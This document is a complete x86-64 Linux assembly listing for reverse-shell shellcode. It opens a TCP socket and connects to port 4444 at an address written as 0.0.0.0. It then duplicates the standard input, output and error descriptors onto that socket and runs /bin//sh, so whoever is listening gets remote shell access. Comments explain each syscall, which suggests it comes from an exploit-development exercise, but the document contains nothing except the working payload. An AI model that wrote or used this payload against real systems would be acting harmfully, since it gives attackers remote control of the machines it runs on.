global _start

section .text

_start:
	 
        
    ; create socket 
        ; sock = socket(AF_INET, SOCK_STREAM, 0)
        ; AF_INET = 2
        ; SOCK_STREAM = 1
        ; syscall number 41 	
       
	push 41       	;sys_socket
	pop rax		
        push 2		; AF_INET
        pop rdi
       	push 1		;SOCK_STREAM
        pop rsi
        xor rdx,	rdx		;rdx = 0
        syscall


	xchg rdi,	rax	;save a socket descriptor
	
connect:
	
	; struct sockaddr_in addr;
    	; addr.sin_family = AF_INET;
    	; addr.sin_port = htons(4444);
   	; addr.sin_addr.s_addr = inet_addr("0.0.0.0");
   	; connect(connect_socket_fd, (struct sockaddr *)&addr, sizeof(addr));
	
	push    2               ;sin_family = AF_INET
        mov word [rsp + 2], 0x5c11      ;port = 4444
        push    rsp
	
	push	42		;sys_connect
	pop 	rax 		
				;rdi already contains a socket descriptor
	pop 	rsi		;(addr.sin_port,2 bytes) push htons(4444)
	push	16		;sizeof(addr)
	pop	rdx
	syscall

    	push 	3		;push counter
        pop 	rsi
dup2loop:
	
        ; int dup2(int oldfd, int newfd);

	push	33		;dup2 syscall
	pop	rax
        dec 	rsi		;next number
        syscall
        loopnz dup2loop  	;loop
	
spawn_shell:

	; int execve(const char *filename, char *const argv[],char *const envp[]);


	xor     rsi,	rsi			 ;clear rsi
	push	rsi			         ;push null on the stack
	mov 	rdi,	0x68732f2f6e69622f	 ;/bin//sh in reverse order
	push	rdi
	push	rsp		
	pop	rdi	        		 ;stack pointer to /bin//sh
	mov 	al,	    59      		 ;sys_execve
	cdq					 ;sign extend of eax
	syscall

*/